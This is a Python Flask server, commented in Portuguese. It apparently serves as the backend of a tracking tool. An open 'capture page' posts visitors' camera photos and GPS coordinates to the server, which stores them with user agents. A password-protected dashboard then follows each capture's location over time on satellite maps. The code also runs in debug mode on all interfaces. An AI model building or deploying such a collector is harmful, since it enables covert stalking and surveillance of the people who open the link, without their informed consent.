from flask import (
    Flask,
    request,
    render_template,
    jsonify,
    redirect,
    url_for,
    session
)

from pathlib import Path
from uuid import uuid4
import sqlite3
from datetime import datetime, timezone
from functools import wraps

from werkzeug.security import (
    check_password_hash
)

import sys


# ============================================================
# CONFIGURAÇÃO
# ============================================================

PROJECT_DIR = Path(__file__).resolve().parent

PARENT_DIR = PROJECT_DIR.parent.parent

if str(PARENT_DIR) not in sys.path:
    sys.path.insert(0, str(PARENT_DIR))


from config import (
    ADMIN_USERNAME,
    ADMIN_PASSWORD_HASH,
    SECRET_KEY
)


# ============================================================
# FLASK
# ============================================================

app = Flask(__name__)

app.secret_key = SECRET_KEY


app.config.update(

    SESSION_COOKIE_SECURE=True,

    SESSION_COOKIE_HTTPONLY=True,

    SESSION_COOKIE_SAMESITE="Lax",

    PERMANENT_SESSION_LIFETIME=3600

)


# ============================================================
# DIRETÓRIOS
# ============================================================

BASE_DIR = PROJECT_DIR

UPLOAD_FOLDER = BASE_DIR / "uploads"

UPLOAD_FOLDER.mkdir(
    exist_ok=True
)


DATABASE = BASE_DIR / "locations.db"


# ============================================================
# BANCO DE DADOS
# ============================================================

def get_db():

    conn = sqlite3.connect(
        DATABASE
    )

    conn.row_factory = sqlite3.Row

    return conn


def init_database():

    with get_db() as conn:

        conn.execute("""
            CREATE TABLE IF NOT EXISTS captures (

                id INTEGER PRIMARY KEY AUTOINCREMENT,

                capture_id TEXT UNIQUE NOT NULL,

                created_at TEXT NOT NULL,

                user_agent TEXT

            )
        """)


        conn.execute("""
            CREATE TABLE IF NOT EXISTS locations (

                id INTEGER PRIMARY KEY AUTOINCREMENT,

                capture_id TEXT NOT NULL,

                latitude REAL NOT NULL,

                longitude REAL NOT NULL,

                accuracy REAL,

                created_at TEXT NOT NULL,

                FOREIGN KEY (
                    capture_id
                )
                REFERENCES captures(
                    capture_id
                )

            )
        """)


        conn.execute("""
            CREATE TABLE IF NOT EXISTS photos (

                id INTEGER PRIMARY KEY AUTOINCREMENT,

                capture_id TEXT NOT NULL,

                location_id INTEGER,

                filename TEXT NOT NULL,

                created_at TEXT NOT NULL,

                FOREIGN KEY (
                    capture_id
                )
                REFERENCES captures(
                    capture_id
                ),

                FOREIGN KEY (
                    location_id
                )
                REFERENCES locations(
                    id
                )

            )
        """)


        conn.execute("""
            CREATE INDEX IF NOT EXISTS
            idx_locations_capture
            ON locations(capture_id)
        """)


        conn.execute("""
            CREATE INDEX IF NOT EXISTS
            idx_photos_capture
            ON photos(capture_id)
        """)


        conn.commit()


init_database()


# ============================================================
# AUTENTICAÇÃO
# ============================================================

def login_required(function):

    @wraps(function)
    def decorated_function(*args, **kwargs):

        if not session.get(
            "authenticated"
        ):

            return redirect(
                url_for("login")
            )

        return function(
            *args,
            **kwargs
        )

    return decorated_function


def api_login_required(function):

    @wraps(function)
    def decorated_function(*args, **kwargs):

        if not session.get(
            "authenticated"
        ):

            return jsonify({
                "success": False,
                "error": "Não autenticado"
            }), 401

        return function(
            *args,
            **kwargs
        )

    return decorated_function


# ============================================================
# LOGIN
# ============================================================

@app.route("/login", methods=["GET", "POST"])
def login():

    if session.get(
        "authenticated"
    ):

        return redirect(
            url_for("dashboard")
        )


    error = None


    if request.method == "POST":

        username = request.form.get(
            "username",
            ""
        ).strip()


        password = request.form.get(
            "password",
            ""
        )


        valid_username = (
            username ==
            ADMIN_USERNAME
        )


        valid_password = False


        if valid_username:

            valid_password = (
                check_password_hash(
                    ADMIN_PASSWORD_HASH,
                    password
                )
            )


        if valid_username and valid_password:

            session.clear()

            session["authenticated"] = True

            session["username"] = (
                ADMIN_USERNAME
            )

            session.permanent = True


            return redirect(
                url_for("dashboard")
            )


        error = (
            "Usuário ou senha inválidos."
        )


    return render_template(
        "login.html",
        error=error
    )


# ============================================================
# LOGOUT
# ============================================================

@app.route("/logout")
def logout():

    session.clear()

    return redirect(
        url_for("login")
    )


# ============================================================
# PÁGINA DE CAPTURA
# ============================================================

@app.route("/")
def index():

    return render_template(
        "index.html"
    )


# ============================================================
# DASHBOARD
# ============================================================

@app.route("/dashboard")
@login_required
def dashboard():

    return render_template(
        "dashboard.html"
    )


# ============================================================
# GARANTIR QUE A CAPTURA EXISTA
# ============================================================

def ensure_capture(
    capture_id,
    user_agent=""
):

    if not capture_id:

        return False


    with get_db() as conn:

        existing = conn.execute("""
            SELECT id
            FROM captures
            WHERE capture_id = ?
        """, (
            capture_id,
        )).fetchone()


        if existing:

            return True


        conn.execute("""
            INSERT INTO captures
            (
                capture_id,
                created_at,
                user_agent
            )
            VALUES (?, ?, ?)
        """, (
            capture_id,
            datetime.now(
                timezone.utc
            ).isoformat(),
            user_agent
        ))


        conn.commit()


    return True


# ============================================================
# RECEBER FOTO
# ============================================================

@app.post("/upload")
def upload():

    photo = request.files.get(
        "photo"
    )


    capture_id = request.form.get(
        "capture_id"
    )


    location_id = request.form.get(
        "location_id"
    )


    if photo is None:

        return jsonify({
            "success": False,
            "error": "Nenhuma foto recebida"
        }), 400


    if not capture_id:

        return jsonify({
            "success": False,
            "error": "capture_id ausente"
        }), 400


    try:

        ensure_capture(
            capture_id,
            request.headers.get(
                "User-Agent",
                ""
            )
        )


        filename = (
            f"{uuid4().hex}.jpg"
        )


        destination = (
            UPLOAD_FOLDER /
            filename
        )


        photo.save(
            destination
        )


        location_id_value = None


        if location_id:

            try:

                location_id_value = int(
                    location_id
                )

            except (
                TypeError,
                ValueError
            ):

                location_id_value = None


        created_at = datetime.now(
            timezone.utc
        ).isoformat()


        with get_db() as conn:

            cursor = conn.execute("""
                INSERT INTO photos
                (
                    capture_id,
                    location_id,
                    filename,
                    created_at
                )
                VALUES (?, ?, ?, ?)
            """, (
                capture_id,
                location_id_value,
                filename,
                created_at
            ))


            photo_id = cursor.lastrowid


            conn.commit()


        return jsonify({

            "success": True,

            "photo_id":
                photo_id,

            "capture_id":
                capture_id,

            "filename":
                filename

        })


    except Exception as e:

        return jsonify({

            "success": False,

            "error":
                str(e)

        }), 500


# ============================================================
# RECEBER LOCALIZAÇÃO
# ============================================================

@app.post("/location")
def location():

    data = request.get_json()


    if not data:

        return jsonify({
            "success": False,
            "error": "Nenhum dado recebido"
        }), 400


    capture_id = data.get(
        "capture_id"
    )


    latitude = data.get(
        "latitude"
    )


    longitude = data.get(
        "longitude"
    )


    accuracy = data.get(
        "accuracy"
    )


    if not capture_id:

        return jsonify({
            "success": False,
            "error": "capture_id ausente"
        }), 400


    if (
        latitude is None
        or
        longitude is None
    ):

        return jsonify({
            "success": False,
            "error":
                "Latitude ou longitude ausente"
        }), 400


    try:

        latitude = float(
            latitude
        )

        longitude = float(
            longitude
        )


        if accuracy is not None:

            accuracy = float(
                accuracy
            )


    except (
        TypeError,
        ValueError
    ):

        return jsonify({
            "success": False,
            "error":
                "Coordenadas inválidas"
        }), 400


    try:

        ensure_capture(
            capture_id,
            request.headers.get(
                "User-Agent",
                ""
            )
        )


        created_at = datetime.now(
            timezone.utc
        ).isoformat()


        with get_db() as conn:

            cursor = conn.execute("""
                INSERT INTO locations
                (
                    capture_id,
                    latitude,
                    longitude,
                    accuracy,
                    created_at
                )
                VALUES (?, ?, ?, ?, ?)
            """, (
                capture_id,
                latitude,
                longitude,
                accuracy,
                created_at
            ))


            location_id = (
                cursor.lastrowid
            )


            conn.commit()


        maps_url = (
            "https://www.google.com/maps"
            f"?z=20&t=k"
            f"&q=loc:{latitude}+{longitude}"
        )


        return jsonify({

            "success": True,

            "location_id":
                location_id,

            "capture_id":
                capture_id,

            "latitude":
                latitude,

            "longitude":
                longitude,

            "accuracy":
                accuracy,

            "maps_url":
                maps_url

        })


    except Exception as e:

        return jsonify({

            "success": False,

            "error":
                str(e)

        }), 500


# ============================================================
# API — LISTAR CAPTURAS
# ============================================================

@app.get("/api/captures")
@api_login_required
def api_captures():

    try:

        with get_db() as conn:

            rows = conn.execute("""
                SELECT

                    c.capture_id,

                    c.created_at,

                    c.user_agent,

                    (
                        SELECT
                            COUNT(*)
                        FROM locations l
                        WHERE
                            l.capture_id =
                            c.capture_id
                    ) AS location_count,

                    (
                        SELECT
                            COUNT(*)
                        FROM photos p
                        WHERE
                            p.capture_id =
                            c.capture_id
                    ) AS photo_count

                FROM captures c

                ORDER BY
                    c.id DESC

            """).fetchall()


        captures = []


        for row in rows:

            captures.append({

                "capture_id":
                    row["capture_id"],

                "created_at":
                    row["created_at"],

                "user_agent":
                    row["user_agent"],

                "location_count":
                    row["location_count"],

                "photo_count":
                    row["photo_count"]

            })


        return jsonify({

            "success": True,

            "captures":
                captures

        })


    except Exception as e:

        return jsonify({

            "success": False,

            "error":
                str(e)

        }), 500


# ============================================================
# API — UMA CAPTURA
# ============================================================

@app.get(
    "/api/captures/<capture_id>"
)
@api_login_required
def api_capture(
    capture_id
):

    try:

        with get_db() as conn:

            capture = conn.execute("""
                SELECT
                    *
                FROM captures
                WHERE
                    capture_id = ?
            """, (
                capture_id,
            )).fetchone()


            if not capture:

                return jsonify({

                    "success":
                        False,

                    "error":
                        "Captura não encontrada"

                }), 404


            last_location = conn.execute("""
                SELECT
                    *
                FROM locations
                WHERE
                    capture_id = ?
                ORDER BY
                    id DESC
                LIMIT 1
            """, (
                capture_id,
            )).fetchone()


            photos = conn.execute("""
                SELECT
                    p.*,
                    l.latitude,
                    l.longitude,
                    l.accuracy
                FROM photos p
                LEFT JOIN locations l
                    ON p.location_id = l.id
                WHERE
                    p.capture_id = ?
                ORDER BY
                    p.id DESC
            """, (
                capture_id,
            )).fetchall()


            locations = conn.execute("""
                SELECT
                    *
                FROM locations
                WHERE
                    capture_id = ?
                ORDER BY
                    id ASC
            """, (
                capture_id,
            )).fetchall()


        capture_data = {

            "capture_id":
                capture["capture_id"],

            "created_at":
                capture["created_at"],

            "user_agent":
                capture["user_agent"]

        }


        if last_location:

            latitude = (
                last_location["latitude"]
            )

            longitude = (
                last_location["longitude"]
            )


            capture_data.update({

                "latitude":
                    latitude,

                "longitude":
                    longitude,

                "accuracy":
                    last_location[
                        "accuracy"
                    ],

                "maps_url":
                    (
                        "https://www.google.com/maps"
                        f"?z=20&t=k"
                        f"&q=loc:{latitude}+{longitude}"
                    )

            })

        else:

            capture_data.update({

                "latitude":
                    None,

                "longitude":
                    None,

                "accuracy":
                    None,

                "maps_url":
                    None

            })


        location_data = []


        for row in locations:

            location_data.append({

                "id":
                    row["id"],

                "capture_id":
                    row["capture_id"],

                "latitude":
                    row["latitude"],

                "longitude":
                    row["longitude"],

                "accuracy":
                    row["accuracy"],

                "created_at":
                    row["created_at"]

            })


        photo_data = []


        for row in photos:

            photo_data.append({

                "id":
                    row["id"],

                "capture_id":
                    row["capture_id"],

                "location_id":
                    row["location_id"],

                "filename":
                    row["filename"],

                "photo_url":
                    url_for(
                        "uploaded_file",
                        filename=row[
                            "filename"
                        ]
                    ),

                "created_at":
                    row["created_at"],

                "latitude":
                    row["latitude"],

                "longitude":
                    row["longitude"],

                "accuracy":
                    row["accuracy"]

            })


        return jsonify({

            "success":
                True,

            "capture":
                capture_data,

            "locations":
                location_data,

            "photos":
                photo_data

        })


    except Exception as e:

        return jsonify({

            "success":
                False,

            "error":
                str(e)

        }), 500


# ============================================================
# API — LOCALIZAÇÕES NOVAS
# ============================================================

@app.get(
    "/api/captures/<capture_id>/locations"
)
@api_login_required
def api_new_locations(
    capture_id
):

    after_id = request.args.get(
        "after_id",
        default=0,
        type=int
    )


    try:

        with get_db() as conn:

            rows = conn.execute("""
                SELECT
                    *
                FROM locations

                WHERE
                    capture_id = ?

                AND
                    id > ?

                ORDER BY
                    id ASC

            """, (
                capture_id,
                after_id
            )).fetchall()


        locations = []


        for row in rows:

            locations.append({

                "id":
                    row["id"],

                "capture_id":
                    row["capture_id"],

                "latitude":
                    row["latitude"],

                "longitude":
                    row["longitude"],

                "accuracy":
                    row["accuracy"],

                "created_at":
                    row["created_at"]

            })


        return jsonify({

            "success":
                True,

            "locations":
                locations

        })


    except Exception as e:

        return jsonify({

            "success":
                False,

            "error":
                str(e)

        }), 500


# ============================================================
# SERVIR IMAGENS
# ============================================================

@app.get(
    "/uploads/<filename>"
)
@api_login_required
def uploaded_file(
    filename
):

    from flask import send_from_directory

    return send_from_directory(
        UPLOAD_FOLDER,
        filename
    )


# ============================================================
# EXECUÇÃO LOCAL
# ============================================================

if __name__ == "__main__":

    app.run(

        host="0.0.0.0",

        port=5000,

        debug=True

    )